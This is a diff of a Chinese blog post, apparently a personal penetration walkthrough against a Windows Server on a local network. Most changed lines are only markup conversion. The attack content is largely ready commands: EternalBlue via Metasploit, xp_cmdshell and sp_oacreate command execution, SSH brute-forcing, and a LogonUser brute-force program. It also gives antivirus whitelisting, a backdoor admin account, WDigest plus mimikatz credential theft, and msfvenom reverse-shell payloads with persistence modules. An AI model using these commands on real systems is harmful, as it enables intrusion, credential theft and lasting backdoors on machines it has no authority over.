@@ -5,11 +5,14 @@ title: SQL Server 另类 getshell
 last_modified_at: 2023-5-4
 slug: sql-server-getshell
 redirect_from:</p>
-<h2>  - /posts/SQL_Server另类getshell</h2>
+<ul>
+<li>/posts/SQL_Server另类getshell</li>
+</ul>
+<hr/>
 <h2>目标环境</h2>
 <p>本机IP地址：<code>192.168.1.233</code>，目标服务器IP地址：<code>192.168.1.66</code></p>
 <p>Windows Server 2008 R2，安装了360安全卫士，扫描结果大致如下：</p>
-<pre><code class="lang-plaintext">80/tcp    open  http               Microsoft IIS httpd 7.5
+<pre><code class="language-plaintext">80/tcp    open  http               Microsoft IIS httpd 7.5
 135/tcp   open  msrpc              Microsoft Windows RPC
 139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
 445/tcp   open  microsoft-ds       Windows Server 2008 R2 Enterprise 7600 microsoft-ds
@@ -24,17 +27,17 @@ Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft
 <p>用了<a href="https://github.com/7kbstorm/7kbscan-RDP-Sniper">这个软件</a>跑，但其实根本没用——被360的安全登录拦了</p>
 <h3>永恒之蓝</h3>
 <p>445 开着，那直接跑个永恒之蓝试试：</p>
-<pre><code class="lang-shell">use exploit/windows/smb/ms17_010_eternalblue
+<pre><code class="language-shell">use exploit/windows/smb/ms17_010_eternalblue
 set rhost 192.168.1.66
 exploit
 </code></pre>
 <p>非常成功的——被拦了。</p>
-<pre><code class="lang-plaintext">[+] 192.168.1.66:445 - The target is vulnerable.
+<pre><code class="language-plaintext">[+] 192.168.1.66:445 - The target is vulnerable.
 [-] 192.168.1.66:445 - Errno::ECONNRESET: An existing connection was forcibly closed by the remote host.
 </code></pre>
 <h2>SQL Server 部分</h2>
 <h3>xp_cmdshell</h3>
-<pre><code class="lang-sql">sp_configure 'show advanced options',1;
+<pre><code class="language-sql">sp_configure 'show advanced options',1;
 reconfigure;
 go;
 sp_configure 'xp_cmdshell',1;
@@ -44,7 +47,7 @@ go;
 <p>然后直接<code>EXEC master..xp_cmdshell 'whoami';</code>就行了，但安全软件绝对会拦。</p>
 <h3>sp_oacreate</h3>
 <p>具体可以看<a href="https://blog.csdn.net/u014029795/article/details/116910134">这篇blog</a>，调用方式如下，但也被拦了</p>
-<pre><code class="lang-sql">declare @shell int;
+<pre><code class="language-sql">declare @shell int;
 exec sp_oacreate 'wscript.shell',@shell output;
 exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami';
 </code></pre>
@@ -52,7 +55,7 @@ exec sp_oamethod @shell,'run',null,'c:\windows\system32\cmd.exe /c whoami';
 <p>依旧是<a href="https://blog.csdn.net/u014029795/article/details/116910134">上面那篇blog</a>，复现时貌似没有找到<code>mdb</code>文件，失败。</p>
 <h3>文件管理</h3>
 <p>对于不涉及具体文件内容的，可以参考<a href="https://www.cnblogs.com/ljhdo/p/4996060.html">这篇博文</a>。具体用到的指令如下：</p>
-<pre><code class="lang-sql">exec master.sys.xp_fileexist 'D:\test.txt'
+<pre><code class="language-sql">exec master.sys.xp_fileexist 'D:\test.txt'
 exec master.sys.xp_create_subdir 'D:\test'
 exec master.sys.xp_dirtree 'D:\data', 2, 1 -- 参数依次为folder, depth, show_file
 exec sys.xp_fixeddrives
@@ -61,80 +64,29 @@ exec sys.xp_fixeddrives
 <p>建议用下文的SQLTOOLS或MSDAT。</p>
 <h3>注册表操作</h3>
 <p>具体参见<a href="https://sqlsolutionsgroup.com/working-registry-sql-server/">这篇文章</a>。相关存储过程如下：</p>
-<table>
-<thead><tr>
-<th>REGULAR</th>
-<th>INSTANCE-AWARE</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>sys.xp_regread</td>
-<td>sys.xp_instance_regread</td>
-</tr>
-<tr>
-<td>sys.xp_regenumvalues</td>
-<td>sys.xp_instance_regenumvalues</td>
-</tr>
-<tr>
-<td>sys.xp_regenumkeys</td>
-<td>sys.xp_instance_regenumkeys</td>
-</tr>
-<tr>
-<td>sys.xp_regwrite</td>
-<td>sys.xp_instance_regwrite</td>
-</tr>
-<tr>
-<td>sys.xp_regdeletevalue</td>
-<td>sys.xp_instance_regdeletevalue</td>
-</tr>
-<tr>
-<td>sys.xp_regdeletekey</td>
-<td>sys.xp_instance_regdeletekey</td>
-</tr>
-<tr>
-<td>sys.xp_regaddmultistring</td>
-<td>sys.xp_instance_regaddmultistring</td>
-</tr>
-<tr>
-<td>sys.xp_regremovemultistring</td>
-<td>sys.xp_instance_regremovemultistring</td>
-</tr>
-</tbody>
-</table>
+<p>| REGULAR |	INSTANCE-AWARE |
+| --- | --- |
+| sys.xp_regread | sys.xp_instance_regread |
+| sys.xp_regenumvalues | sys.xp_instance_regenumvalues |
+| sys.xp_regenumkeys | sys.xp_instance_regenumkeys |
+| sys.xp_regwrite | sys.xp_instance_regwrite |
+| sys.xp_regdeletevalue | sys.xp_instance_regdeletevalue |
+| sys.xp_regdeletekey | sys.xp_instance_regdeletekey |
+| sys.xp_regaddmultistring | sys.xp_instance_regaddmultistring |
+| sys.xp_regremovemultistring | sys.xp_instance_regremovemultistring |</p>
 <p>所有的<code>hive</code>如下：</p>
-<table>
-<thead><tr>
-<th>REGISTRY HIVE</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>HKEY_CURRENT_CONFIG</td>
-</tr>
-<tr>
-<td>HKEY_CURRENT_USER</td>
-</tr>
-<tr>
-<td>HKEY_LOCAL_MACHINE\SAM</td>
-</tr>
-<tr>
-<td>HKEY_LOCAL_MACHINE\Security</td>
-</tr>
-<tr>
-<td>HKEY_LOCAL_MACHINE\Software</td>
-</tr>
-<tr>
-<td>HKEY_LOCAL_MACHINE\System</td>
-</tr>
-<tr>
-<td>HKEY_USERS.DEFAULT</td>
-</tr>
-</tbody>
-</table>
+<p>| REGISTRY HIVE |
+| --- |
+| HKEY_CURRENT_CONFIG |
+| HKEY_CURRENT_USER |
+| HKEY_LOCAL_MACHINE\SAM |
+| HKEY_LOCAL_MACHINE\Security |
+| HKEY_LOCAL_MACHINE\Software |
+| HKEY_LOCAL_MACHINE\System |
+| HKEY_USERS.DEFAULT |</p>
 <p>每个<code>hive</code>包含多个<code>key</code>（即注册表编辑器左边的文件夹），每个<code>key</code>可以包含其它<code>key</code>；每个<code>key</code>下面可以包含任意多组<code>value</code>，每组<code>value</code>由<code>名字</code>、<code>数据类型</code>、<code>数值</code>组成。</p>
 <p>以下是一个查询示例：</p>
-<pre><code class="lang-sql">EXECUTE master.sys.xp_regread 
+<pre><code class="language-sql">EXECUTE master.sys.xp_regread 
     'HKEY_LOCAL_MACHINE', 
     'Software\Microsoft\Microsoft SQL Server\MSSQL12.SQL2014\SQLServerAgent', 
     'WorkingDirectory';
@@ -150,7 +102,7 @@ exec sys.xp_fixeddrives
 <h3>向日葵远程控制</h3>
 <p>使用了<a href="https://github.com/wafinfo/Sunflower_get_Password">这个项目</a>读取配置文件，但最终由于服务器端向日葵离线没有成功。</p>
 <p>可能的数个配置文件读取命令：</p>
-<pre><code class="lang-shell">type C:\Windows\System32\config\systemprofile\AppData\Roaming\Oray\SunloginClient\sys_config.ini
+<pre><code class="language-shell">type C:\Windows\System32\config\systemprofile\AppData\Roaming\Oray\SunloginClient\sys_config.ini
 type "C:\Program Files\Oray\SunLogin\SunloginClient\config.ini"
 type C:\ProgramData\Oray\SunloginClient\config.ini
 reg query HKEY_USERS\.DEFAULT\Software\Oray\SunLogin\SunloginClient\SunloginInfo
@@ -164,7 +116,7 @@ reg query HKEY_USERS\.DEFAULT\Software\Oray\SunLogin\SunloginClient\SunloginGree
 <p><a href="https://www.freebuf.com/sectool/177187.html">简略教程</a></p>
 <p><a href="https://github.com/quentinhardy/msdat">项目主页</a></p>
 <p>顺便丢一个乱写的目录上传脚本：</p>
-<pre><code class="lang-python">import os
+<pre><code class="language-python">import os
 src=r"C:\ProgramData\ssh"
 dst=r"C:\ProgramData\ssh"
 exclude=[r"sshd.pid", r"sshd_config"]
@@ -196,7 +148,7 @@ for i in files:
 <p>具体来说，首先用上面的MSDAT传了<a href="https://github.com/PowerShell/Win32-OpenSSH/releases/">OpenSSH</a>以及凭据、配置文件上去。</p>
 <p>配置文件中，修改了监听端口、允许密码登录、禁用登录超时、删除<code>Match Group administrators</code>这一部分。</p>
 <p>然后修复了文件权限（一行一行输）（实际情况可能还有不同，可仿照此部分自行调整）：</p>
-<pre><code class="lang-shell">del C:\ProgramData\ssh\administrators_authorized_keys
+<pre><code class="language-shell">del C:\ProgramData\ssh\administrators_authorized_keys
 icacls.exe "C:\ProgramData\ssh\administrators_authorized_keys" /inheritance:r /grant "Administrator:F" （上面这两行貌似没用）
 icacls.exe "C:\Users\Administrator\.ssh\authorized_keys" /inheritance:r /grant "Administrator:F" /remove Administrators /remove SYSTEM
 icacls C:\ProgramData\ssh\ /setowner Administrator /t /c /q
@@ -205,10 +157,10 @@ icacls C:\ProgramData\ssh\ /grant Administrator:(F) /t /c /q
 icacls C:\ProgramData\ssh\ssh_host_rsa_key （这一行只是用于查看的）
 </code></pre>
 <p>接着，用这行命令重启服务：</p>
-<pre><code class="lang-shell">cmd /c "taskkill /f /im sshd.exe &amp; C:\OpenSSH-Win64\sshd.exe"
+<pre><code class="language-shell">cmd /c "taskkill /f /im sshd.exe &amp; C:\OpenSSH-Win64\sshd.exe"
 </code></pre>
 <p>然后用Metasploit爆破：</p>
-<pre><code class="lang-shell">use auxiliary/scanner/ssh/ssh_login
+<pre><code class="language-shell">use auxiliary/scanner/ssh/ssh_login
 set RHOST 192.168.1.66
 set RPORT 52917
 set USERNAME Administrator
@@ -221,7 +173,7 @@ run
 </code></pre>
 <p>然后……一秒内就出来了……我大受震撼.jpg</p>
 <p>或者你也可以直接先用公钥连接过去，虽然应该没什么用。</p>
-<pre><code class="lang-shell">use auxiliary/scanner/ssh/ssh_login_pubkey
+<pre><code class="language-shell">use auxiliary/scanner/ssh/ssh_login_pubkey
 set RHOST 192.168.1.66
 set RPORT 52917
 set USERNAME Administrator
@@ -231,7 +183,7 @@ run
 </code></pre>
 <h3>爆破密码的另一种方式（Windows API）</h3>
 <p>其实直接用下面的代码调用<code>LogonUser</code>函数理论也可以本地爆破密码，杀软一般不报毒。</p>
-<pre><code class="lang-c">#include &lt;Windows.h&gt;
+<pre><code class="language-c">#include &lt;Windows.h&gt;
 #include &lt;tchar.h&gt;
 #include &lt;stdio.h&gt;
 #define LENGTH 2000
@@ -263,18 +215,18 @@ int main(){
 <h3>安全软件</h3>
 <p>给几个常用目录加白名单或加入360“开发者模式”的路径，然后马就可以随便放啦。</p>
 <h3>账户添加</h3>
-<pre><code class="lang-shell">net user user password123 /add
+<pre><code class="language-shell">net user user password123 /add
 net localgroup administrators user /add
 </code></pre>
 <h3>系统账户凭据窃取</h3>
 <p>先用下面这条保存明文凭据（目标账户重新登录后生效）：</p>
-<pre><code class="lang-shell">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
+<pre><code class="language-shell">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
 </code></pre>
 <p>然后就可以用mimikatz窃取了。建议直接在目标系统运行。</p>
-<pre><code class="lang-shell">mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+<pre><code class="language-shell">mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
 </code></pre>
 <p>或者用meterpreter：</p>
-<pre><code class="lang-shell">getsystem
+<pre><code class="language-shell">getsystem
 load kiwi
 kiwi_cmd sekurlsa::logonpasswords
 
@@ -286,23 +238,24 @@ creds_all
 <p>适用于保存了远程桌面密码的系统。</p>
 <p>比较复杂，<a href="https://blog.csdn.net/huyaguang/article/details/127071365">详细教程</a></p>
 <p>或者用mimikatz直接解决，该方式可能需要先开启一个远程桌面连接（<a href="https://tools.thehacker.recipes/mimikatz/modules/ts">具体说明</a>）：</p>
-<pre><code class="lang-shell">privilege::debug
+<pre><code class="language-shell">privilege::debug
 ts::mstsc
 ts::logonpassword
 </code></pre>
 <h3>Metasploit权限维持</h3>
 <p>先生成个木马（分别为64位与32位）：</p>
-<pre><code class="lang-shell">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.233 LPORT=7777 --platform Windows -f exe &gt; s.exe
+<pre><code class="language-shell">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.233 LPORT=7777 --platform Windows -f exe &gt; s.exe
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.233 LPORT=7778 -a x86 --platform Windows -f exe &gt; s2.exe
+
 </code></pre>
 <p>然后在msfconsole中监听：</p>
-<pre><code class="lang-shell">handler -H 192.168.1.233 -P 7777 -p windows/x64/meterpreter/reverse_tcp
+<pre><code class="language-shell">handler -H 192.168.1.233 -P 7777 -p windows/x64/meterpreter/reverse_tcp
 handler -H 192.168.1.233 -P 7778 -p windows/meterpreter/reverse_tcp
 </code></pre>
 <p>上传木马，运行，不出意外的话就能收到session了。</p>
 <p>接下来做权限维持。注意以下命令仅适用于64位系统，32位系统请自行参考注释内容调整。32位与64位必须与目标系统严格保持一致。</p>
 <p>请注意，一切以<code>#</code>开头的内容都应被手动删除。不要把它们输入在命令中。</p>
-<pre><code class="lang-shell"># use exploit/windows/local/persistence_service # 以服务方式安装
+<pre><code class="language-shell"># use exploit/windows/local/persistence_service # 以服务方式安装
 use exploit/windows/local/persistence
 set lhost 192.168.1.233
 set payload windows/x64/meterpreter/reverse_tcp
